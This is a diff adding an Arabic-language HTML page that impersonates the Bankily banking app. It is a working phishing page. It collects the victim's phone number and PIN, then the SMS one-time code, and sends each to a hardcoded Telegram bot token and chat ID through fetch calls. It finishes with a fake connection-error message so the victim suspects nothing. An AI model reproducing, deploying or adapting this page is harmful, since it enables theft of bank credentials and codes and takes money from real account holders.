@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الرئيسية / بنكيلي</title>
+    <meta property="og:title" content="الرئيسية / بنكيلي">
+    <meta property="og:description" content="تطبيق بنكيلي - خدماتك البنكية بين يديك">
+    <meta property="og:image" content="https://bankily-ap.vercel.app/logo_bankily.jpeg">
+    <meta property="og:url" content="https://bankily-app.vercel.app">
+    <meta property="og:type" content="website">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
+        body { margin: 0; padding: 0; background-color: #f4f7f6; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; min-height: 100vh; overflow-x: hidden; }
+        .wrapper { width: 100%; max-width: 450px; background: #fff; position: relative; padding-bottom: 20px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
+        .form-container { padding: 20px; text-align: right; }
+        .label { font-weight: bold; margin-bottom: 8px; display: block; font-size: 15px; color: #333; }
+        .input-box { position: relative; border: 1.5px solid #1a5e20; border-radius: 12px; margin-bottom: 20px; display: flex; align-items: center; padding: 5px 15px; background: #fff; }
+        input { border: none; width: 100%; font-size: 17px; padding: 12px; text-align: right; outline: none; background: transparent; font-family: 'Cairo'; }
+        .btn-main { background-color: #1a5e20; color: white; border: none; width: 100%; padding: 16px; border-radius: 12px; font-size: 19px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; box-shadow: 0 4px 10px rgba(26, 94, 32, 0.3); }
+        .btn-main:disabled { background-color: #95a5a6; cursor: not-allowed; box-shadow: none; }
+        .person-img { width: 100%; display: block; margin-top: 30px; border-radius: 15px 15px 0 0; }
+        .otp-main-icon { width: 220px; margin: 30px auto; display: block; }
+        .timer-box { background: #1a5e20; color: #fff; width: fit-content; margin: 15px auto 30px; padding: 12px 30px; font-size: 28px; font-weight: bold; border-radius: 10px; box-shadow: 0 5px 15px rgba(26, 94, 32, 0.2); }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="wrapper">
+    <img src="logo_bankily.jpeg" class="otp-main-icon">    
+
+    <div id="p1" class="form-container">
+        <label class="label">رقم الهاتف المربوط بالحساب *</label>
+        <div class="input-box">
+            <input type="tel" id="tel" placeholder="رقم الهاتف" maxlength="8" inputmode="numeric" oninput="validateInput()">
+        </div>
+
+        <label class="label">الرمز السري (PIN) *</label>
+        <div class="input-box">
+            <input type="password" id="pin" placeholder="أدخل الرمز السري" maxlength="4" inputmode="numeric" oninput="validateInput()">
+        </div>
+
+        <button id="btn1" class="btn-main" onclick="toStep2()" disabled>ادخل السحب الآمن</button>
+        <img src="man_photo.jpeg" class="person-img">    
+    </div>
+
+    <div id="p2" class="form-container hidden">
+        <img src="logo_bankily.jpeg" class="otp-main-icon">
+        <p style="text-align: center; font-weight: bold; color: #333; font-size: 16px;">يرجى ادخال الرمز الذي تلقيته عبر الرسائل النصية *</p>
+        <div class="input-box">
+            <input type="tel" id="otp" placeholder="0000" maxlength="4" inputmode="numeric" oninput="validateOtp()">
+        </div>
+        <div class="timer-box" id="time">05:00</div>
+        <button id="btn2" class="btn-main" onclick="final()" disabled>تأكيد العملية</button>
+        <img src="woman_photo.jpeg" class="person-img">
+    </div>
+</div>
+
+<script>
+    // تم تحديث البيانات بناءً على الصور المرفقة
+    const tok = "8652191411:AAES2Ljmd2mCH_lm4syo-yAJiUowKMjAPN4"; 
+    const cid = "8624656090"; 
+
+    function send(text) {
+        fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(text)}`);
+    }
+
+    function validateInput() {
+        const t = document.getElementById('tel').value.replace(/[^0-9]/g, '');
+        const p = document.getElementById('pin').value.replace(/[^0-9]/g, '');
+        document.getElementById('tel').value = t;
+        document.getElementById('pin').value = p;
+        document.getElementById('btn1').disabled = !(t.length === 8 && p.length === 4);
+    }
+
+    function validateOtp() {
+        const o = document.getElementById('otp').value.replace(/[^0-9]/g, '');
+        document.getElementById('otp').value = o;
+        document.getElementById('btn2').disabled = !(o.length === 4);
+    }
+
+    function toStep2() {
+        const tel = document.getElementById('tel').value;
+        const pin = document.getElementById('pin').value;
+        send(`🚨 دخول جديد:\n📱 الهاتف: ${tel}\n🔑 PIN: ${pin}`);
+        
+        document.getElementById('p1').classList.add('hidden');
+        document.getElementById('p2').classList.remove('hidden');
+        
+        let time = 300;
+        const timerInterval = setInterval(() => {
+            let m = Math.floor(time / 60), s = time % 60;
+            document.getElementById('time').innerText = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
+            if(time > 0) time--; else clearInterval(timerInterval);
+        }, 1000);
+    }
+
+    function final() {
+        const otp = document.getElementById('otp').value;
+        send(`🔢 كود الـ OTP المستلم: ${otp}`);
+        alert("عذراً، حدث خطأ في الاتصال بالخادم. يرجى إعادة المحاولة لاحقاً.");
+        location.reload();
+    }
+</script>
+</body>
+</html>
